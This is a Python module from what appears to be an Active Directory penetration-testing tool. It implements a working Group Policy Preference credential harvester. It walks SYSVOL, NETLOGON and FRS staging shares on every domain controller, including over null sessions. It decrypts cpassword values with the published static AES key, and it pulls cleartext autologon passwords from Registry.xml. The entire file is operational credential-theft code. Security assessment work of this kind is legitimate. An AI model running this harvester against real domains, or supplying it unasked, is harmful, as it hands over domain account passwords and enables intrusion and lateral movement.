"""Unified GPP credential harvester (cpassword + autologin).

Single source of truth for harvesting credentials from Group Policy
Preference XML files. Replaces:

* The cpassword-only walker that lived in
  :mod:`adscan_internal.services.unauth_enrichment_service` (which silently
  ignored ``Registry.xml`` because it filtered for the literal ``cpassword``
  substring before parsing).
* The NetExec ``-M gpp_autologin`` subprocess in
  :mod:`adscan_internal.cli.smb` (subprocess hop replaced by a native
  aiosmb spider, in line with the migration direction in CLAUDE.md).

Two attack vectors covered in one filesystem pass:

* **GPP cpassword**  — Groups.xml, Services.xml, Drives.xml,
  ScheduledTasks XML, etc. AES-256-CBC with the Microsoft-published static
  key (MSDN 2C15CBF0). Decryption is in-process; no impacket dependency.
* **GPP autologin**  — Registry.xml entries setting ``DefaultPassword`` /
  ``DefaultUserName`` / ``DefaultDomainName`` (the Get-GPPAutologon.ps1 /
  PowerShellMafia vector).

Scope policy
------------

Where it makes sense to look — explicit, closed catalog::

    DEFAULT_GPP_SHARES = (
        "SYSVOL",        # canonical, replicated to every DC
        "NETLOGON",      # same volume as SYSVOL, often readable
        "Replication",   # legacy FRS staging — readable on misconfigured
                         # 2008 R2 DCs; HTB Active is exactly this surface
        "SYSVOL_DFSR",   # variant exposed by failed FRS->DFSR migrations
        "NtFrs",         # FRS staging directory exposed as its own share
    )

Where to point the harvester:

* **All DCs of the target domain**, not only the PDC. A misconfigured
  secondary DC can leak files the PDC has cleaned up, and FRS staging
  shares typically only exist on the FRS source DC (often *not* the PDC).
  The cost is bounded — SYSVOL is small (<100MB in normal envs) and
  results are deduped on ``(username, secret)`` so duplicate hits across
  replicated DCs collapse to one.

* **Not all hosts**.  GPP files do not land on random member servers.
  Hunting "credentials in shares" across the wider estate is what
  manspider / share-spidering already covers in ADscan; this harvester
  stays narrow on purpose.

The same harvester runs in both the unauthenticated null-session flow and
the authenticated flow — the only difference is the ``SMBConnection`` it
receives.
"""

from __future__ import annotations

import asyncio
import base64
import xml.etree.ElementTree as ET
from collections.abc import Awaitable, Callable, Sequence
from dataclasses import dataclass, field
from typing import Any, Literal

from adscan_core import telemetry
from adscan_core.rich_output import print_exception

TaskStatus = Literal["done", "denied", "error", "skipped"]


# Microsoft-published GPP static AES-256 key (MSDN 2C15CBF0).
_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)
_GPP_IV = b"\x00" * 16

DEFAULT_GPP_SHARES: tuple[str, ...] = (
    "SYSVOL",
    "NETLOGON",
    "Replication",
    "SYSVOL_DFSR",
    "NtFrs",
)

# Per-walk safety caps. GPP shares are normally small; these caps bound the
# blast radius if someone points the walker at a misconfigured share that
# happens to mirror a huge volume.
_DEFAULT_MAX_DEPTH = 8
_DEFAULT_MAX_FILES = 5000
_DEFAULT_MAX_FILE_BYTES = 2 * 1024 * 1024  # 2 MiB — GPP XMLs are tiny

# Depth for the TARGETED walk, counted from the ``<share>\<domain>\Policies`` root.
# A cpassword file sits at ``Policies\{GUID}\Machine\Preferences\Groups\Groups.xml``
# (5 levels below Policies) and a GPP ``Registry.xml`` at
# ``Policies\{GUID}\Machine\Preferences\Registry\Registry.xml`` (also 5); 6 gives one
# level of headroom without ever walking outside the policy tree.
_GPP_POLICIES_WALK_DEPTH = 6


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class GPPCpasswordLeak:
    """One GPP cpassword leak with native AES-decrypted plaintext."""

    unc_path: str
    username: str
    cpassword_ciphertext: str
    cleartext: str  # "" if decrypt failed (rare with the static key)
    xml_type: str  # Groups | Services | Drives | ScheduledTasks | ...
    source_share: str = ""
    source_target: str = ""


@dataclass
class GPPAutologinLeak:
    """One GPP-deployed Windows autologon credential (Registry.xml)."""

    unc_path: str
    username: str  # DefaultUserName
    password: str  # DefaultPassword (cleartext — never encrypted)
    domain: str  # DefaultDomainName (may be empty)
    source_share: str = ""
    source_target: str = ""


@dataclass
class GPPHarvestResult:
    """Aggregate outcome of a GPP harvest across one or many targets."""

    cpassword_leaks: list[GPPCpasswordLeak] = field(default_factory=list)
    autologin_leaks: list[GPPAutologinLeak] = field(default_factory=list)
    status: TaskStatus = "skipped"
    error: str | None = None
    targets_walked: list[str] = field(default_factory=list)
    shares_walked: list[str] = field(default_factory=list)

    @property
    def has_findings(self) -> bool:
        return bool(self.cpassword_leaks or self.autologin_leaks)

    def merge(self, other: GPPHarvestResult) -> None:
        """In-place merge with dedup on (username, secret)."""
        seen_cp = {(g.username, g.cleartext) for g in self.cpassword_leaks}
        for leak in other.cpassword_leaks:
            key = (leak.username, leak.cleartext)
            if key in seen_cp:
                continue
            seen_cp.add(key)
            self.cpassword_leaks.append(leak)

        seen_al = {(a.username, a.password) for a in self.autologin_leaks}
        for leak in other.autologin_leaks:
            key = (leak.username, leak.password)
            if key in seen_al:
                continue
            seen_al.add(key)
            self.autologin_leaks.append(leak)

        for share in other.shares_walked:
            if share not in self.shares_walked:
                self.shares_walked.append(share)
        for target in other.targets_walked:
            if target not in self.targets_walked:
                self.targets_walked.append(target)

        # Status promotion: any "done" wins over "denied"/"error", any
        # finding promotes to "done".
        priority = {"skipped": 0, "error": 1, "denied": 2, "done": 3}
        if priority.get(other.status, 0) > priority.get(self.status, 0):
            self.status = other.status
        if self.has_findings:
            self.status = "done"
        if other.error and not self.error:
            self.error = other.error


# ---------------------------------------------------------------------------
# Decryption + XML parsing
# ---------------------------------------------------------------------------


def decrypt_gpp_cpassword(cpassword: str) -> str:
    """AES-256-CBC decrypt a Microsoft GPP cpassword string.

    The cpassword as stored in Groups.xml/Services.xml is base64 with the
    trailing ``=`` padding stripped. We re-pad to a multiple of 4, base64
    decode, then AES-256-CBC decrypt with the published static key and a
    zero IV. Output is UTF-16-LE encoded by Windows; we strip PKCS7-style
    trailing bytes and decode.
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    if not cpassword:
        return ""

    padded = cpassword + "=" * ((4 - len(cpassword) % 4) % 4)
    ciphertext = base64.b64decode(padded)
    if len(ciphertext) % 16 != 0:
        ciphertext += b"\x00" * (16 - len(ciphertext) % 16)

    cipher = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(_GPP_IV))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    if plaintext:
        last = plaintext[-1]
        if 1 <= last <= 16 and plaintext.endswith(bytes([last]) * last):
            plaintext = plaintext[:-last]

    try:
        return plaintext.decode("utf-16-le").rstrip("\x00").strip()
    except UnicodeDecodeError:
        return plaintext.decode("utf-8", errors="ignore").rstrip("\x00").strip()


def _parse_autologin_registry_xml(
    xml_text: str,
) -> list[tuple[str, str, str]]:
    """Extract ``(username, password, domain)`` tuples from a Registry.xml.

    Group Policy stores ``HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon``
    autologon values as ``Properties`` elements with ``name`` =
    ``DefaultUserName`` / ``DefaultPassword`` / ``DefaultDomainName``. The
    XML is namespaced in some Windows versions; ``ET.fromstring`` tolerates
    that since we look at the local ``name`` attribute, not the tag.
    """
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return []

    user = ""
    password = ""
    domain = ""
    found_password = False
    for prop in root.iter():
        if not prop.tag.endswith("Properties"):
            continue
        attrs = prop.attrib
        name = attrs.get("name") or ""
        value = attrs.get("value") or ""
        if name == "DefaultUserName":
            user = value
        elif name == "DefaultPassword":
            password = value
            found_password = True
        elif name == "DefaultDomainName":
            domain = value

    if not found_password or not user:
        return []
    return [(user, password, domain)]


# ---------------------------------------------------------------------------
# Single-connection harvester
# ---------------------------------------------------------------------------


def _share_from_root_unc(root_unc: str) -> str:
    """Extract the share name from a ``\\\\host\\SHARE\\...`` UNC root."""

    parts = str(root_unc or "").replace("/", "\\").strip("\\").split("\\")
    # parts == [host, SHARE, <domain>, Policies, ...]
    return parts[1] if len(parts) >= 2 else ""


def _build_gpp_policy_roots(
    target: str, domain: str, shares: Sequence[str]
) -> list[str]:
    """Build the targeted ``\\\\target\\<share>\\<domain>\\Policies`` roots.

    GPP Preference / Registry XML live exclusively under a policy GUID inside
    ``<domain>\\Policies`` on the replicated volume: ``SYSVOL`` normally, and the FRS
    staging shares (``Replication`` / ``SYSVOL_DFSR`` / ``NtFrs``) on legacy FRS DCs,
    which is where HTB-Active-style boxes expose it. Returns an empty list when the
    domain is unknown, so the caller falls back to folder discovery.
    """

    dom = str(domain or "").strip().strip("\\/")
    if not dom:
        return []
    roots: list[str] = []
    for share in shares:
        name = str(share or "").strip().strip("\\/")
        if name:
            roots.append(f"\\\\{target}\\{name}\\{dom}\\Policies")
    return roots


async def _discover_gpp_policy_roots(
    connection: Any,
    target: str,
    shares: Sequence[str],
    *,
    per_root_timeout: float,
) -> list[str]:
    """Discover ``<folder>\\Policies`` roots when the domain folder name is unknown.

    Lists each candidate share's ROOT one level deep to find the domain folder(s)
    (normally exactly one, the domain FQDN) and returns a targeted ``Policies`` root
    per discovered folder. One shallow listing per share, never a full-tree walk, so
    it stays bounded even as a fallback.
    """

    from aiosmb.commons.interfaces.directory import SMBDirectory

    async def _list_top_folders(unc: str) -> list[str]:
        found: list[str] = []
        try:
            root_dir = SMBDirectory.from_uncpath(unc)
        except Exception:  # noqa: BLE001
            return found
        async for entry, otype, err in root_dir.list_r(connection, depth=1):
            if err is not None:
                continue
            if otype == "dir":
                dname = str(getattr(entry, "name", "") or "").strip()
                if dname and dname not in (".", ".."):
                    found.append(dname)
        return found

    roots: list[str] = []
    for share in shares:
        name = str(share or "").strip().strip("\\/")
        if not name:
            continue
        try:
            folders = await asyncio.wait_for(
                _list_top_folders(f"\\\\{target}\\{name}"), timeout=per_root_timeout
            )
        except Exception:  # noqa: BLE001
            folders = []
        for folder in folders:
            roots.append(f"\\\\{target}\\{name}\\{folder}\\Policies")
    return roots


async def harvest_gpp_on_connection(
    connection: Any,
    *,
    domain: str = "",
    shares: Sequence[str] = DEFAULT_GPP_SHARES,
    timeout: int = 120,
    max_depth: int = _GPP_POLICIES_WALK_DEPTH,
    max_files: int = _DEFAULT_MAX_FILES,
    max_file_bytes: int = _DEFAULT_MAX_FILE_BYTES,
) -> GPPHarvestResult:
    """Walk one already-logged-in SMB connection for GPP credentials.

    The caller owns the connection lifecycle (``async with connection: ...``);
    this function only reads. Per-share failures are non-fatal — a missing or
    denied share is recorded in ``error`` and the walker moves on to the next.
    """
    from aiosmb.commons.interfaces.file import SMBFile
    from aiosmb.commons.utils.cpasswd import parse_cpasswd

    from adscan_internal.services.smb_bounded_walk import bounded_share_walk

    target = connection.target.get_hostname_or_ip()
    result = GPPHarvestResult()
    result.targets_walked.append(target)
    dom = str(domain or "").strip().strip("\\/")

    async def _on_file(path: Any) -> None:
        """Parse one XML file entry for GPP cpassword + autologin credentials."""
        fullpath_lower = str(getattr(path, "fullpath", "") or "").lower()
        if not fullpath_lower.endswith(".xml"):
            return
        is_registry = fullpath_lower.endswith("\\registry.xml") or (
            fullpath_lower.endswith("/registry.xml")
        )
        file_obj = SMBFile.from_uncpath(path.unc_path)
        _, ferr = await file_obj.open(connection)
        if ferr is not None:
            return
        try:
            data, derr = await file_obj.read(max_file_bytes)
        finally:
            try:
                await file_obj.close()
            except Exception:  # noqa: BLE001
                pass
        if derr is not None or not data:
            return
        text = data.decode("utf-8", errors="ignore")
        text_lower = text.lower()
        share = _share_from_root_unc(str(path.unc_path))

        # cpassword: any GPP XML with the literal substring.
        if "cpassword" in text_lower:
            try:
                entries = parse_cpasswd(path.unc_path, text)
            except Exception as parse_exc:  # noqa: BLE001
                telemetry.capture_exception(parse_exc)
                print_exception(exception=parse_exc)
                entries = []
            for entry in entries:
                cpw = entry.get("cpassword", "") or ""
                if not cpw:
                    continue
                try:
                    cleartext = decrypt_gpp_cpassword(cpw)
                except Exception as decrypt_exc:  # noqa: BLE001
                    telemetry.capture_exception(decrypt_exc)
                    print_exception(exception=decrypt_exc)
                    cleartext = ""
                result.cpassword_leaks.append(
                    GPPCpasswordLeak(
                        unc_path=str(entry.get("filename") or path.unc_path),
                        username=str(entry.get("username") or ""),
                        cpassword_ciphertext=cpw,
                        cleartext=cleartext,
                        xml_type=str(entry.get("xmltype") or ""),
                        source_share=share,
                        source_target=target,
                    )
                )

        # autologin: Registry.xml with DefaultPassword. The quick substring check
        # before XML parsing avoids paying the parse cost on every Registry.xml.
        if is_registry and "defaultpassword" in text_lower:
            for user, pwd, autolog_dom in _parse_autologin_registry_xml(text):
                if not user or not pwd:
                    continue
                result.autologin_leaks.append(
                    GPPAutologinLeak(
                        unc_path=path.unc_path,
                        username=user,
                        password=pwd,
                        domain=autolog_dom,
                        source_share=share,
                        source_target=target,
                    )
                )

    # TARGETED walk: GPP files live ONLY under ``<share>\<domain>\Policies``, so walk
    # exactly that subtree per candidate share (cost O(#GPOs)) instead of the whole
    # share tree (O(SYSVOL)). This is the fix for enterprise SYSVOLs blowing the old
    # single global budget — the phantom FRS staging shares now fail fast per root,
    # and the SYSVOL walk is bounded by GPO count, not total volume size. Each root
    # carries its OWN time budget with partial results, so a slow root can no longer
    # cancel the whole harvest and lose everything with ``shares=[]``.
    roots = _build_gpp_policy_roots(target, dom, shares)
    outcome = await bounded_share_walk(
        connection,
        roots=roots,
        on_file=_on_file,
        depth=max_depth,
        max_files=max_files,
        per_root_timeout=float(timeout),
    )
    # Fallback: the SYSVOL domain folder may not equal ``domain`` (a renamed domain,
    # a single-label NetBIOS folder, or an unknown domain). Discover the real
    # ``<folder>\Policies`` once and retry, so a name mismatch never misses GPP.
    if not result.has_findings and not outcome.roots_walked:
        disc_roots = await _discover_gpp_policy_roots(
            connection, target, shares, per_root_timeout=float(timeout)
        )
        if disc_roots:
            outcome = await bounded_share_walk(
                connection,
                roots=disc_roots,
                on_file=_on_file,
                depth=max_depth,
                max_files=max_files,
                per_root_timeout=float(timeout),
            )

    for root_unc in outcome.roots_walked:
        share_name = _share_from_root_unc(root_unc)
        if share_name and share_name not in result.shares_walked:
            result.shares_walked.append(share_name)

    if not result.shares_walked and not result.has_findings:
        # Nothing readable anywhere. Distinguish an honest timeout (a reachable DC
        # whose targeted walk still ran out of budget — a data gap) from a clean
        # denial, so the coverage message stays truthful.
        if outcome.partial:
            result.status = "error"
            result.error = "GPP harvest timed out"
        else:
            result.status = "denied"
            result.error = outcome.last_error or "No GPP shares readable"
        return result

    result.status = "done"
    # A per-root failure on a missing FRS staging share is expected once SYSVOL
    # walked; only surface it when nothing walked at all.
    if outcome.last_error and not result.shares_walked:
        result.error = outcome.last_error
    return result


# ---------------------------------------------------------------------------
# Multi-target orchestrator
# ---------------------------------------------------------------------------


async def harvest_gpp_across_targets(
    *,
    targets: Sequence[str],
    open_connection: Callable[[str], Awaitable[Any]],
    domain: str = "",
    shares: Sequence[str] = DEFAULT_GPP_SHARES,
    timeout_per_target: int = 120,
    max_concurrent: int = 4,
) -> GPPHarvestResult:
    """Harvest GPP credentials across a list of DCs in parallel.

    ``open_connection`` is an async factory that takes one target hostname/IP
    and returns an *unentered* aiosmb ``SMBConnection`` (the orchestrator
    handles ``async with`` and ``login()``). This keeps the harvester
    agnostic of the auth mode — caller decides null vs authenticated.

    Per-target failures are isolated; one denied or unreachable DC does not
    abort the rest. Final result is the merged + deduped union across all
    successful targets.
    """
    aggregate = GPPHarvestResult()
    if not targets:
        aggregate.status = "skipped"
        aggregate.error = "no targets supplied"
        return aggregate

    semaphore = asyncio.Semaphore(max(1, max_concurrent))

    async def _one(target: str) -> GPPHarvestResult:
        async with semaphore:
            try:
                connection = await open_connection(target)
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                r = GPPHarvestResult(status="error", error=f"{target}: {exc}")
                r.targets_walked.append(target)
                return r
            try:
                async with connection:
                    _, login_err = await connection.login()
                    if login_err is not None:
                        r = GPPHarvestResult(
                            status="denied", error=f"{target}: {login_err}"
                        )
                        r.targets_walked.append(target)
                        return r
                    return await harvest_gpp_on_connection(
                        connection,
                        domain=domain,
                        shares=shares,
                        timeout=timeout_per_target,
                    )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                r = GPPHarvestResult(status="error", error=f"{target}: {exc}")
                r.targets_walked.append(target)
                return r

    per_target = await asyncio.gather(
        *[_one(t) for t in targets], return_exceptions=False
    )
    for r in per_target:
        aggregate.merge(r)

    if not aggregate.targets_walked:
        aggregate.targets_walked = list(targets)
    return aggregate
